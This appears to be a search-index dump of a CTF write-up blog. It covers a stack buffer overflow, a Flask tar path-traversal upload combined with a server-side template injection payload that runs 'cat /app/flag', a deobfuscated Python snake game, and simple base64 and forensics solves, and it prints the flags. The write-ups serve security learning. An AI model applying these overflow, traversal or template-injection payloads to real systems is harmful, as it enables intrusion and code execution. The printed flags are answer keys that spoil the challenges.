certain value:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; // Defined in a separate source file for simplicity. void init_visualize(char* buff); void visualize(char* buff); void safeguard(); void print_flag(); void vuln() { char padding[16]; char buff[32]; int notsecret = 0xffffff00; int secret = 0xdeadbeef; memset(buff, 0, sizeof(buff)); // Zero-out the buffer. memset(padding, 0xFF, sizeof(padding)); // Zero-out the padding. // Initializes the stack visualization. Don't worry about it! init_visualize(buff); // Prints out the stack before modification visualize(buff); printf(\"Input some text: \"); gets(buff); // This is a vulnerable call! // Prints out the stack after modification visualize(buff); // Check if secret has changed. if (secret == 0x67616c66) { puts(\"You did it! Congratuations!\"); print_flag(); // Print out the flag. You deserve it. return; } else if (notsecret != 0xffffff00) { puts(\"Uhmm... maybe you overflowed too much. Try deleting a few characters.\"); } else if (secret != 0xdeadbeef) { puts(\"Wow you overflowed the secret value! Now try controlling the value of it!\"); } else { puts(\"Maybe you haven't overflowed enough characters? Try again?\"); } exit(0); } int main() { setbuf(stdout, NULL); setbuf(stdin, NULL); safeguard(); vuln(); }  The aim of the challenge is to modify the variable secret so that it is equal to 0x67616c66 and we enter in the if clause that calls print_flag.\nIf we execute the program, it shows the stack to help us with the exploitation:\n$ nc thekidofarcrania.com 35235 Legend: buff MODIFIED padding MODIFIED notsecret MODIFIED secret MODIFIED CORRECT secret 0xffb1c278 | 00 00 00 00 00 00 00 00 | 0xffb1c280 | 00 00 00 00 00 00 00 00 | 0xffb1c288 | 00 00 00 00 00 00 00 00 | 0xffb1c290 | 00 00 00 00 00 00 00 00 | 0xffb1c298 | ff ff ff ff ff ff ff ff | 0xffb1c2a0 | ff ff ff ff ff ff ff ff | 0xffb1c2a8 | ef be ad de 00 ff ff ff | 0xffb1c2b0 | c0 75 ef f7 84 7f 60 56 | 0xffb1c2b8 | c8 c2 b1 ff 11 5b 60 56 | 0xffb1c2c0 | e0 c2 b1 ff 00 00 00 00 | Input some text: AAAA Legend: buff MODIFIED padding MODIFIED notsecret MODIFIED secret MODIFIED CORRECT secret 0xffb1c278 | 41 41 41 41 00 00 00 00 | 0xffb1c280 | 00 00 00 00 00 00 00 00 | 0xffb1c288 | 00 00 00 00 00 00 00 00 | 0xffb1c290 | 00 00 00 00 00 00 00 00 | 0xffb1c298 | ff ff ff ff ff ff ff ff | 0xffb1c2a0 | ff ff ff ff ff ff ff ff | 0xffb1c2a8 | ef be ad de 00 ff ff ff | 0xffb1c2b0 | c0 75 ef f7 84 7f 60 56 | 0xffb1c2b8 | c8 c2 b1 ff 11 5b 60 56 | 0xffb1c2c0 | e0 c2 b1 ff 00 00 00 00 | Maybe you haven't overflowed enough characters? Try again?  We need to enter more characters to reach the red numbers on the stack (namely, 48 characters). Let\u0026rsquo;s test it:\n$ python3 -c 'print(\"A\" * 48 + \"B\" * 4)' | nc thekidofarcrania.com 35235 Legend: buff MODIFIED padding MODIFIED notsecret MODIFIED secret MODIFIED CORRECT secret 0xff995cb8 | 00 00 00 00 00 00 00 00 | 0xff995cc0 | 00 00 00 00 00 00 00 00 | 0xff995cc8 | 00 00 00 00 00 00 00 00 | 0xff995cd0 | 00 00 00 00 00 00 00 00 | 0xff995cd8 | ff ff ff ff ff ff ff ff | 0xff995ce0 | ff ff ff ff ff ff ff ff | 0xff995ce8 | ef be ad de 00 ff ff ff | 0xff995cf0 | c0 e5 f3 f7 84 af 5c 56 | 0xff995cf8 | 08 5d 99 ff 11 8b 5c 56 | 0xff995d00 | 20 5d 99 ff 00 00 00 00 | Input some text: Legend: buff MODIFIED padding MODIFIED notsecret MODIFIED secret MODIFIED CORRECT secret 0xff995cb8 | 41 41 41 41 41 41 41 41 | 0xff995cc0 | 41 41 41 41 41 41 41 41 | 0xff995cc8 | 41 41 41 41 41 41 41 41 | 0xff995cd0 | 41 41 41 41 41 41 41 41 | 0xff995cd8 | 41 41 41 41 41 41 41 41 | 0xff995ce0 | 41 41 41 41 41 41 41 41 | 0xff995ce8 | 42 42 42 42 00 ff ff ff | 0xff995cf0 | c0 e5 f3 f7 84 af 5c 56 | 0xff995cf8 | 08 5d 99 ff 11 8b 5c 56 | 0xff995d00 | 20 5d 99 ff 00 00 00 00 | Wow you overflowed the secret value! Now try controlling the value of it!  Nice, we have control over the value of secret. Now we need to overwrite it with 0x67616c66 in order to call print_flag. The hexadecimal number must be sent in little-endian format (that is, the bytes in reverse order: \u0026quot;\\x66\\x6c\\x61\\x67\u0026quot;). Fortunately, these bytes are ASCII printable characters that correspond to the string \u0026quot;flag\u0026quot;. Let\u0026rsquo;s use it:\n$ python3 -c 'print(\"\\x66\\x6c\\x61\\x67\")' flag $ python3 -c 'print(\"A\" * 48 + \"flag\")' | nc thekidofarcrania.com 35235 Legend: buff MODIFIED padding MODIFIED notsecret MODIFIED secret MODIFIED CORRECT secret 0xffc59198 | 00 00 00 00 00 00 00 00 | 0xffc591a0 | 00 00 00 00 00 00 00 00 | 0xffc591a8 | 00 00 00 00 00 00 00 00 | 0xffc591b0 | 00 00 00 00 00 00 00 00 | 0xffc591b8 | ff ff ff ff ff ff ff ff | 0xffc591c0 | ff ff ff ff ff ff ff ff | 0xffc591c8 | ef be ad de 00 ff ff ff | 0xffc591d0 | c0 e5 f3 f7 84 af 5c 56 | 0xffc591d8 | 08 5d 99 ff 11 8b 5c 56 | 0xffc591e0 | 20 5d 99 ff 00 00 00 00 | Input some text: Legend: buff MODIFIED padding MODIFIED notsecret MODIFIED secret MODIFIED CORRECT secret 0xffc59198 | 41 41 41 41 41 41 41 41 | 0xffc591a0 | 41 41 41 41 41 41 41 41 | 0xffc591a8 | 41 41 41 41 41 41 41 41 | 0xffc591b0 | 41 41 41 41 41 41 41 41 | 0xffc591b8 | 41 41 41 41 41 41 41 41 | 0xffc591c0 | 41 41 41 41 41 41 41 41 | 0xffc591c8 | 66 6c 61 67 00 ff ff ff | 0xffc591d0 | c0 75 f1 f7 84 7f 5e 56 | 0xffc591d8 | e8 91 c5 ff 11 5b 5e 56 | 0xffc591e0 | 00 92 c5 ff 00 00 00 00 | You did it! Congratuations! CTFlearn{buffer_0verflows_4re_c00l!}  ","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/ctflearn/binary/simple-bof/","section":"ctf","summary":"32-bit binary. Buffer Overflow. Local variable modification","time":6,"title":"Simple bof"},{"contents":"We are given a file called data.dat and we are told to count every line that has a number of 0 that is multiple of 3 or that has a number of 1 that is a multiple of 2.\nWe can take a look at the first lines of the file:\n$ head data.dat 0001100000101010100 110101000001111 101100011001110111 0111111010100 1010111111100011 1110011110010110 11100101010110111 10101101011 1111011101001 0001110001  Alright. The idea is to iterate the file on each line and add 1 to a counter (initialized with 0) if the condition is satisfied.\nThis Ruby code does the task:\n#!/usr/bin/env ruby counter = 0 File.readlines('data.dat').each do |line| counter += 1 if line.count('0') % 3 == 0 or line.count('1') % 2 == 0 end puts \"CTFlearn{#{counter}}\"  $ ruby solve.rb CTFlearn{6662}  It is also possible to use filter to remove all the unwanted lines, and some number methods, and then just print the length of the resulting array:\n#!/usr/bin/env ruby puts \"CTFlearn{#{File.readlines('data.dat').filter do |line| (line.count('0') % 3).zero? or line.count('1').even? end.length}}\"  These scripts can be found here: solve.rb and solve2.rb.\n","image":"/images/programming.png","permalink":"https://7rocky.github.io/en/ctf/ctflearn/programming/simple-programming/","section":"ctf","summary":"Iterate a file and count lines that match a condition","time":1,"title":"Simple Programming"},{"contents":"We have a simple web back-end that allows us to upload a .tar.gz file. As we have a Dockerfile, let\u0026rsquo;s use a Docker container locally:\nOn the source code we have a simple Python Flask application:\n@api.route('/unslippy', methods=['POST']) def cache(): if 'file' not in request.files: return abort(400) extraction = extract_from_archive(request.files['file']) if extraction: return {'list': extraction}, 200 return '', 204  The file is being extracted and written to /tmp:\nimport tarfile, tempfile, os from application import main generate = lambda x: os.urandom(x).hex() def extract_from_archive(file): tmp = tempfile.gettempdir() path = os.path.join(tmp, file.filename) file.save(path) if tarfile.is_tarfile(path): tar = tarfile.open(path, 'r:gz') tar.extractall(tmp) extractdir = f'{main.app.config[\"UPLOAD_FOLDER\"]}/{generate(15)}' os.makedirs(extractdir, exist_ok=True) extracted_filenames = [] for tarinfo in tar: name = tarinfo.name if tarinfo.isreg(): filename = f'{extractdir}/{name}' os.rename(os.path.join(tmp, name), filename) extracted_filenames.append(filename) continue os.makedirs(f'{extractdir}/{name}', exist_ok=True) tar.close() return extracted_filenames return False  Since the challenge is called Slippy, one can think of Zip Slip, but in .tar.gz files. This consists of compressing a file that contains a path traversal, so that when extracted, the path traversal is done and the file is written to another directory.\nLet\u0026rsquo;s create this file structure:\n$ tree asdf asdf ├── app │ ├── application │ │ └── templates │ │ └── index.html │ └── flag └── asdf └── asdf └── asdf └── firmware.tar.gz 6 directories, 3 files  The idea is to go to asdf/asdf/asdf/asdf and create a firmware.tar.gz file containing ../../../app/application/templates/index.html:\n$ tar -czf firmware.tar.gz ../../../app/application/templates/index.html  This route can be discovered if we access into the container or we look at the Dockerfile:\n# Setup app RUN mkdir -p /app # Switch working environment WORKDIR /app # Add application COPY challenge .  The idea is to overwrite index.html, so let\u0026rsquo;s put a simple message to see if it works, and then compress the file as shown before. Then, we upload it and refresh the page:\nNice, we can write arbitrary files. Now, to get the flag (it is stored in a file), we can use a Server-Side Template Injection (SSTI) payload, since it is using Flask.\nFor example, we can put this payload into index.html:\n{{ cycler.__init__.__globals__.os.popen('cat /app/flag').read() }}  After compressing the file, uploading it and refreshing the page:\nOk, let\u0026rsquo;s upload the firmware.tar.gz to the live instance:\n","image":"/images/web.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/web/slippy/","section":"ctf","summary":"TAR Directory Path Traversal. Server-Side Template Injection","time":2,"title":"Slippy"},{"contents":"We are given a binary file called chall.pyc, so we know it is a binary compiled using Python:\n$ file chall.pyc chall.pyc: python 2.7 byte-compiled  First of all, we can extract the Python source code using uncompyle6. Since it is compiled with python2.7, we can use a Docker container for that purpose:\n$ docker run -v \"$PWD\":/ctf -it python:2.7 bash root@11d1f884672f:~# cd /ctf root@11d1f884672f:/ctf# pip install uncompyle6 DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. A future version of pip will drop support for Python 2.7. More details about Python 2 support in pip, can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support Collecting uncompyle6 Downloading uncompyle6-3.8.0-py2-none-any.whl (317 kB) |████████████████████████████████| 317 kB 3.6 MB/s Collecting spark-parser\u0026lt;1.9.0,\u0026gt;=1.8.9 Downloading spark_parser-1.8.9-py2-none-any.whl (17 kB) Collecting xdis\u0026lt;6.1.0,\u0026gt;=6.0.2 Downloading xdis-6.0.3-py2-none-any.whl (137 kB) |████████████████████████████████| 137 kB 9.8 MB/s Collecting click Downloading click-7.1.2-py2.py3-none-any.whl (82 kB) |████████████████████████████████| 82 kB 1.5 MB/s Installing collected packages: click, spark-parser, xdis, uncompyle6 Successfully installed click-7.1.2 spark-parser-1.8.9 uncompyle6-3.8.0 xdis-6.0.3 WARNING: You are using pip version 20.0.2; however, version 20.3.4 is available. You should consider upgrading via the '/usr/local/bin/python -m pip install --upgrade pip' command. root@11d1f884672f:/ctf# uncompyle6 chall.pyc \u0026gt; chall.py root@11d1f884672f:/ctf# cat chall.py  # uncompyle6 version 3.8.0 # Python bytecode 2.7 (62211) # Decompiled from: Python 2.7.18 (default, Apr 21 2020, 09:53:40) # [GCC 8.3.0] # Warning: this version of Python has problems handling the Python 3 byte type in constants properly. # Embedded file name: ./snake_obf.py # Compiled at: 2022-01-17 22:16:46 import marshal, types, time ll = types.FunctionType(marshal.loads(('YwEAAAABAAAABQAAAEMAAABzNAAAAHQAAGoBAHQCAGoDAHQEAGQBAIMBAGoFAHwAAGoGAGQCAIMB\\nAIMBAIMBAHQHAIMAAIMCAFMoAwAAAE50BAAAAHpsaWJ0BgAAAGJhc2U2NCgIAAAAdAUAAAB0eXBl\\nc3QMAAAARnVuY3Rpb25UeXBldAcAAABtYXJzaGFsdAUAAABsb2Fkc3QKAAAAX19pbXBvcnRfX3QK\\nAAAAZGVjb21wcmVzc3QGAAAAZGVjb2RldAcAAABnbG9iYWxzKAEAAAB0AQAAAHMoAAAAACgAAAAA\\ncwcAAAA8c3RkaW4+dAoAAABsb2FkTGFtYmRhAQAAAHQAAAAA\\n').decode('base64')), globals()) i0 = ll('eJxLZoACJiB2BuJiLiBRwsCQwsjQzMgQrAES9ythA5JFiXkp+bkajCB5kKL4+Mzcgvyikvh4DZAB\\nCKKYHUjYFJekZObZlXCA2DmJuUkpiXaMEKMZGAC+nBJh\\n') i1 = ll('eJxLZoACJiB2BuJiLiBRwsCQwsjQzMgQrAES9ythA5LJpUXFqcUajCB5kKL4+Mzcgvyikvh4DZAB\\nCKKYHUjYFJekZObZlXCA2DmJuUkpiXaMEKMZGADEORJ1\\n') f0 = ll('eJxLZmRgYABhJiB2BuJiXiBRw8CQxcCQwsjQzMgQrAGS8ssEEgwaIJUl7CAiMzc1v7QEIsAMJMoz\\n8zTASkBEMUiJTXFJSmaeXQkHiJ2TmJuUkmgHVg5SAQBjWRD5\\n') f1 = ll('eJxLZmRgYIBhZyAu5gISNQwMWQwMzQwMwRogcT8wWcIKJNJTS5IzIFxmIFGemacBpBjARDE7kLAp\\nLknJzLMr4QCxcxJzk1IS7cDKQSoAvuUPJw==\\n') f2 = ll('eJx1kL1uwkAQhOfOBsxPQZUmL+DOEnWUBghEQQbFIESVglUkY5ECX+lHoMz7Jrt7HCgSOWlGO/rm\\n1tbtIwBBY1b9zdYYkEFlcRqiAQoWxaginDJhjcUBijNQy+O24jxgfzsHdTxOFB8DtoqPoK7HPcXn\\ngCPFZ1BfcUGsdMA/lpc/fEqeUBq21Mp0L0rv/3grX/f5aELlbryVYzbXZnub7j42K5dcxslym7vu\\nJby/zubrK1pMX9apPLOTraReqe9T3SlWd9ieakfl17OTb36OpFE/CDQDE5vHv7K/FKBNmA==\\n') f3 = ll('eJxVj00KAjEMhV+b8Q9040IZT9C9WxHEvRvBC1iFUhhk2sUIIwgexLWn1KQzI9qSl/DlhaZHDSDj\\nII4tR3ix1IBVyK1GXitImt/0l1JDSSih1rAZfIZyI4x9BRIkeKA8SLeF1Dl9clIHG+c9OakdZ35O\\nT/o+yiciZI2Hgvpt702Pt925Nx/HFZwSGbIYqaL87FS5aKSIgi5JbZR/F1WTrkZmk4QByypE64p1\\nap6X4g8LaaoZ3zFGfzFVE/UBTuovhA==\\n') f4 = ll('eJw1zDsKgEAMBNCJilb2drZ7AEuxsbfxBOIHFFkWNqWdF3eyYJEXkgxZcwB/jazYkkdwUeAVCAcV\\nW3F4MjTt7ISZyWVUS7KEsPtN7cW9e2ddLeKTIXk7gkSsSB91O/2g9uToLBELO0otH2W6Ez8=\\n') f5 = ll('eJxdjr0OwjAMhM9J+as6M7HTF0AsiKV7F54ACJUKVaiSjOnEi2MbISQGf4rtu3OuMwBSBVfDFQdG\\nBhzwMAgNMsER1s58+wJ3Hlm4Ai/z33YGE+A1IrNljnBBtiLYT1ZSf2sr6lMt19u+ZPYQkGDJqA0j\\nycfap7+lBT/C2bveJ/UkEQ7KqByTGMbPKNQSpojiPMTEzqNKup2aKlnShramopJW5g2ipyUM\\n') f6 = ll('eJxdjTEOglAQRB98iMbEKxhLbkBjaLSwsrHWBEUJCRKULTT5VFzc3W9nMS+zk93ZqwNS1UK1VQ17\\nRQ0CVcQUsTvljO4vWjEmSIRP8A4PXn3MlHKOea4DlxyzWMsOjXUHK/bpVXb1TWy855kF2gN9SPo2\\nDD9+At8Zdm4YZorNIFXTFTI335aPS1UWtie28QV3xx4p\\n') f7 = ll('eJxtjz8LwjAQxV/S1mrRxcnZKat/qyAuOrv0E4ilIJRS2hsUCg7OfmcvubZTIe/97nKPcHkEADpd\\nWPWPjYCGj0Kj0fjIfHwVqiWIbzxbJ6SHEleQ1yf8ocQHFLSJqgKN+nTYVUUEGndNCiRG8UY3M7F7\\nabb7TrAS7AVrQSw4CDaCreBo7CfJPvdy/nZeummZuyY3bHBWh2ynmtJncXaRLLaJem6HaqGiVlMV\\n6Zn+Azn/L1k=\\n') f8 = ll('eJwljr0KAkEMhCf3o2hrIb7BlWIhFiKC1jYWViKHe+qKnHob0GKt7sVNcsV8ZDeTSc45gJ5oINqI\\nwkkQgTvQAvRdgwmO0BK2xxl+uTUTxBwugUtxT8EZIiHKZ4o21dZE7FLRe4yD+nMLixlchvG+0KU7\\nPxR6EVjhSVDoKazt86MqG6uasr5WrI3SucCNbJPEp685keIy576aqktThVs3r0kf48s8r4c9Ogaj\\nL3SnIej8MrDz9aqLXJhPzwMNaURT4R/aUC0X\\n') a1 = ll('eJxLZmRgYIBhZyAuZgESKYwMwRpMQIZfCUhcWwNIMGiAmGB+DoQPIorZgYRNcUlKZp5dCQeInZOY\\nm5SSaAdWDFIBALI0C1U=\\n') a2 = ll('eJxLZmRgYIBhZyAuZgESKYwMwRpMQIZfCUhcWQNIMGiAmGB+DoQPIorZgYRNcUlKZp5dCQeInZOY\\nm5SSaAdWDFIBALBMC00=\\n') a3 = ll('eJw10EtLw0AUBeAzTWLqo74bML8gSyFdiotm40rEZF+kRyVtCGKmqzar/nHvHBDmfty5c+fBrB2A\\niUVuUVkMG4MOnIARGIMJeAKm4BQ8Bc9UsfwcvABn/5VL8Aq81tINeAveKb/Hd47R4WDDTp5j7hEm\\nR4fsoS4yu+7Vh1e8yEYu5V7WciffZCl/5UpW8l162cuF3Mq1fJSUY5uYhTZFRvfZF+EvfOCnU89X\\ngdATGFLjafBs+2e1fJShY4jDomvcH1q4K9U=\\n') a4 = ll('eJxLZmRgYIBhZyAuZgESKYwMwRpMQIZfCUhcRQNIMGiAmGB+DoQPIorZgYRNcUlKZp5dCQeInZOY\\nm5SSaAdWDFIBALCJC04=\\n') a5 = ll('eJxNzTELwjAQBeCXS4r6TzKJP6DUgruLq0s1S7BKIRkqJP/dd3Hp8D4ex3H3NAA6xjEXJo2kAHeH\\nalAF1aI6FINg8BIsZxTZdM5lM2/95i2PXCNBPBCvzeubLOR4yvp2bX6bS3P+LyppR/qUQ/wMea99\\nnt6PMA26l/SKxQ/XGxky\\n') a6 = ll('eJwlzLsKwkAQheF/L0afw2qr4AOENOnT2NpEgyDGENgtFHbfPTNrcT6G4cw8DHCQeMkgiWchw81T\\nDMVSHMWTDdnytGTHu+Ea9G4MAkHPkxXaS9L1t/qrbtXlX1TiUehiml9rn046L9PnPk+99qJ+cewN\\nxxM9\\n') a7 = ll('eJwlzLEKwjAQxvF/rhF9jk6Zig8gXdy7uLq0FqFYRUiGFpJ39y4O34/j+O4eDjhovOaqia2S4e4p\\njiKUhuLJjiw8hex5Cbdgd0NQCHaeROnOydZbda9+q+u/aMSjcolpXj59Otm8ju9pHnvrRfvS8AMM\\nqhM6\\n') a8 = ll('eJxLZmRgYABhJiB2BuJiPiBRw8CQwsgglsLEkM3EEKzBDBTyy2QFkplAzKABJkCaSkBEjgZcsJgd\\nSNgUl6Rk5tmVcIDYOYm5SSmJdmDFIBUAVDAM/Q==\\n') a9 = ll('eJxLZmRgYIBhZyAuZgESKYwMwRpMQIZfCUhcQQNIMGiAmGB+DoQPIorZgYRNcUlKZp5dCQeInZOY\\nm5SSaAdWDFIBAK+VC0o=\\n') m0 = ll('eJw1jTELwjAUhC9Jq/0VzhldBAfr4u7i6mYpFFSKCXRJp/7x3rsi5L5Avnsvrx0AS8PcmNQSGSg8\\nDsWjBJQKS42nxwzMQSog09b/gsrs9AGP6LjhHr3tMfSn7TpH+yebfYtJHGXH7eknTpGAkPbEJeVu\\n+F5V/Bw1Wpl0B7cCYGsZOw==\\n') m1 = ll('eJw1zUEKAjEMBdCfdMQreIRuRwU3Mhv3bjzCDAOCitCAm7rqxU1+cZGX0v408wbAvy5e5eQYUAUm\\nqAnNHdASvsJLhSVUBpryoPG6Km5ZfPaah/hBnXXf29jbsbdDjl0W2Tdd6IN+6JwdkLJ1zsWW+2vi\\n/HOMRIklkJ38AF2QGOk=\\n') m2 = ll('eJxNjj8LAjEMxV96fz+Fk0NHdT5c3F1cD5c7BEHlsAWXdrov7kuKICS/0LyXpFMP4JcnZrgSEUgM\\nQXJIDVKLtcHokAWZKvsVUm0eGjr1rC3GCplBW/03Xpy2hM5bj4sXnjh7p4cUz30pO6+fiKouxtn6\\ny8MehcH4MU7GtydgCB0xhDjfX8ey8mAzrYqyka18AW5IIKw=\\n') def snake(w): r = i0() c = i1() f0(w) d = (0, 1) p = [(5, 5)] pl = 1 s = 0 l = None while 1: p, d, pl, l, s, w, c, r = m2(p, d, pl, l, s, w, c, r) time.sleep(0.4) return i1().wrapper(snake) # okay decompiling chall.pyc  Ok, it is a bit obfuscated with marshal\u0026hellip; Let\u0026rsquo;s run the script and see what we have:\nroot@11d1f884672f:/ctf# python chall.py  ++++++++++ + + + + + $+ + + + + + # + + + + + ++++++++++  We have a Snake game where the snake is the # and the apples are the $. If we play a bit, we will notice that the $ changes after some time to T, then to B, then to {\u0026hellip; But eventually the snake will be so long that we can\u0026rsquo;t continue playing:\n++++++++++ + + + + + T # + + # + + # + + # + + # + + + ++++++++++  ++++++++++ + ## + + # + + # + + # + + # + + # + + # + + ## B+ ++++++++++  ++++++++++ +### + +# + +# { + +# + +# + +# + +####### + + + ++++++++++  So the flag is there, in the apples. Looking again at the main function, we have some variables we can analyze:\ndef snake(w): r = i0() c = i1() f0(w) d = (0, 1) p = [(5, 5)] pl = 1 s = 0 l = None while 1: p, d, pl, l, s, w, c, r = m2(p, d, pl, l, s, w, c, r) time.sleep(0.4) return  These variables must be the parameters used by the game to play. To know which variable is which value (position, snake, position of the apple, score\u0026hellip;), we can use a file to output all the variables on each movement:\ndef snake(w): with open('log.txt', 'a') as fd: r = i0() c = i1() f0(w) d = (0, 1) p = [(5, 5)] pl = 1 s = 0 l = None while 1: fd.write('p = %s; d = %s, pl = %s; l = %s; s = %s; w = %s; c = %s; r = %s\\n' % (p, d, pl, l, s, w, c, r)) p, d, pl, l, s, w, c, r = m2(p, d, pl, l, s, w, c, r) time.sleep(0.4) return  Now we can play a bit and then check the log file:\nroot@11d1f884672f:/ctf# tail log.txt p = [(5, 4), (4, 4), (3, 4), (2, 4), (1, 4)]; d = (-1, 0), pl = 5; l = None; s = 37; w = \u0026lt;_curses.curses window object at 0xffff8d53f5d0; c = \u0026lt;module 'curses' from '/usr/local/lib/python2.7/curses/__init__.pyc'\u0026gt;; r = \u0026lt;module 'random' from '/usr/local/lib/python2.7/random.pyc'\u0026gt; p = [(4, 4), (3, 4), (2, 4), (1, 4), (8, 4)]; d = (-1, 0), pl = 5; l = None; s = 38; w = \u0026lt;_curses.curses window object at 0xffff8d53f5d0; c = \u0026lt;module 'curses' from '/usr/local/lib/python2.7/curses/__init__.pyc'\u0026gt;; r = \u0026lt;module 'random' from '/usr/local/lib/python2.7/random.pyc'\u0026gt; p = [(3, 4), (2, 4), (1, 4), (8, 4), (7, 4)]; d = (-1, 0), pl = 5; l = None; s = 39; w = \u0026lt;_curses.curses window object at 0xffff8d53f5d0; c = \u0026lt;module 'curses' from '/usr/local/lib/python2.7/curses/__init__.pyc'\u0026gt;; r = \u0026lt;module 'random' from '/usr/local/lib/python2.7/random.pyc'\u0026gt; p = [(2, 4), (1, 4), (8, 4), (7, 4), (6, 4)]; d = (-1, 0), pl = 5; l = None; s = 40; w = \u0026lt;_curses.curses window object at 0xffff8d53f5d0; c = \u0026lt;module 'curses' from '/usr/local/lib/python2.7/curses/__init__.pyc'\u0026gt;; r = \u0026lt;module 'random' from '/usr/local/lib/python2.7/random.pyc'\u0026gt; p = [(1, 4), (8, 4), (7, 4), (6, 4), (5, 4)]; d = (-1, 0), pl = 5; l = (6, 5); s = 41; w = \u0026lt;_curses.curses window object at 0xffff8d53f5d0; c = \u0026lt;module 'curses' from '/usr/local/lib/python2.7/curses/__init__.pyc'\u0026gt;; r = \u0026lt;module 'random' from '/usr/local/lib/python2.7/random.pyc'\u0026gt; p = [(8, 4), (7, 4), (6, 4), (5, 4), (5, 5)]; d = (0, 1), pl = 5; l = (6, 5); s = 42; w = \u0026lt;_curses.curses window object at 0xffff8d53f5d0; c = \u0026lt;module 'curses' from '/usr/local/lib/python2.7/curses/__init__.pyc'\u0026gt;; r = \u0026lt;module 'random' from '/usr/local/lib/python2.7/random.pyc'\u0026gt; p = [(7, 4), (6, 4), (5, 4), (5, 5), (6, 5)]; d = (1, 0), pl = 6; l = None; s = 43; w = \u0026lt;_curses.curses window object at 0xffff8d53f5d0; c = \u0026lt;module 'curses' from '/usr/local/lib/python2.7/curses/__init__.pyc'\u0026gt;; r = \u0026lt;module 'random' from '/usr/local/lib/python2.7/random.pyc'\u0026gt; p = [(7, 4), (6, 4), (5, 4), (5, 5), (6, 5), (7, 5)]; d = (1, 0), pl = 6; l = None; s = 44; w = \u0026lt;_curses.curses window object at 0xffff8d53f5d0; c = \u0026lt;module 'curses' from '/usr/local/lib/python2.7/curses/__init__.pyc'\u0026gt;; r = \u0026lt;module 'random' from '/usr/local/lib/python2.7/random.pyc'\u0026gt; p = [(6, 4), (5, 4), (5, 5), (6, 5), (7, 5), (8, 5)]; d = (1, 0), pl = 6; l = None; s = 45; w = \u0026lt;_curses.curses window object at 0xffff8d53f5d0; c = \u0026lt;module 'curses' from '/usr/local/lib/python2.7/curses/__init__.pyc'\u0026gt;; r = \u0026lt;module 'random' from '/usr/local/lib/python2.7/random.pyc'\u0026gt; p = [(5, 4), (5, 5), (6, 5), (7, 5), (8, 5), (1, 5)]; d = (1, 0), pl = 6; l = None; s = 46; w = \u0026lt;_curses.curses window object at 0xffff8d53f5d0; c = \u0026lt;module 'curses' from '/usr/local/lib/python2.7/curses/__init__.pyc'\u0026gt;; r = \u0026lt;module 'random' from '/usr/local/lib/python2.7/random.pyc'\u0026gt;  We can guess that p are the coordinates of each # of the snake and pl is the score we have (that equals the length of the snake). d seems to be the direction of the snake (up, right, down, left), and s is the number of movements from start. Then w, c and r are just curses objects to render the map.\nThere might be other ways to get the flag. I decided to trick the game to increase the score by one on every step and set the p variable to a fix coordinate, so that I can see the apple changing from $ to a character of the flag without worrying about the snake. Then, I can just make notes of the characters and done:\ndef snake(w): r = i0() c = i1() f0(w) d = (0, 1) p = [(5, 5)] pl = 1 s = 0 l = None while 1: p, d, pl, l, s, w, c, r = m2(p, d, pl, l, s, w, c, r) pl += 1 p = [(5, 5)] time.sleep(0.4) return  Here is a GIF that shows the cheated game:\nAnd the flag is HTB{SuP3r_S3CRt_Sn4k3c0d3}.\n","image":"/images/reversing.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/reversing/snakecode/","section":"ctf","summary":"Python script extraction. Dynamic analysis. Game cheating","time":7,"title":"Snakecode"},{"contents":"We are told to find the flag in this image:\nHowever, the flag is not visible inside the image and it is not hidden in its content. However, we can find the flag in the file raw content.\nIn order to extract printable characters from the image we can use strings and take the first values with head:\n$ strings snowboard.jpg | head JFIF CTFlearn{CTFIsEasy!!!} Q1RGbGVhcm57U2tpQmFuZmZ9Cg== Exif Canon Canon EOS 6D Mark II GIMP 2.10.6 2019:05:07 14:37:21 0230 2018:08:23 12:52:08  We see a flag: CTFlearn{CTFIsEasy!!!}, but it is not correct.\nBelow that, there is a string encoded in Base64, which decodes to another flag:\n$ echo Q1RGbGVhcm57U2tpQmFuZmZ9Cg== | base64 -d CTFlearn{SkiBanff}  And this one is correct.\n","image":"/images/forensics.png","permalink":"https://7rocky.github.io/en/ctf/ctflearn/forensics/snowboard/","section":"ctf","summary":"Printable characters in files. Base64 encoding","time":1,"title":"Snowboard"},{"contents":"We are given a pretty large file:\  Looking at the characters and the name of the challenge, we can guess that it is the result of encoding a certain string multiple times in Base64.\nSince there are a lot of encoding processes, we can use a loop in Bash until we find the flag in plain text:\n$ f=$(cat flag.txt); while true; do if [[ $f = CTFlearn* ]]; then echo $f; break; fi; f=$(echo $f | base64 -d); done CTFlearn{pr3tty_b4s1c_r1ght?}  ","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/ctflearn/cryptography/so-many-64s/","section":"ctf","summary":"Multiple Base64 encoding","time":1,"title":"So many 64s"},{"contents":"We are given a 64-bit binary called sp_entrypoint:\nArch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./glibc/'  We can run it to view two options:\n$ ./sp_entrypoint Authentication System ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓ 